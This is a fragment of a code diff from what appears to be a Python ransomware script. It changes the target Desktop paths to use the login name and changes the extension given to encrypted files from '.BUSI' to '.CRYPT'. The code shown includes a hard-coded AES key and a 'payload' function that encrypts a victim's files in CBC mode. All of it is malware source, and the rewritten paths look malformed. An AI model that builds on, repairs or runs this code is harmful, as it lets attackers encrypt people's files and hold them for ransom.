@@ -8,8 +8,8 @@ KEY = hashlib.sha256("BUSIDO").digest()
 SYS_INFO = {"SYSTEM":None, "PATH":None}
 LOGIN = os.getlogin()
 
-v1 = "/root/Desktop/"
-v2 = "/root/desktop/"
+v1 = "/" + str(LOGIN) + "/Desktop/"
+v2 = "/" + str(LOGIN) + "/desktop/"
 
 def print_banner():
 	banner = '''
@@ -46,7 +46,7 @@ def get_system():
 def payload(key, in_filename, out_filename=None, chunksize=64*1024):
 	
 	if not out_filename:
-		out_filename = in_filename + '.BUSI'
+		out_filename = in_filename + '.CRYPT'
 
 	iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
 	encryptor = AES.new(key, AES.MODE_CBC, iv)
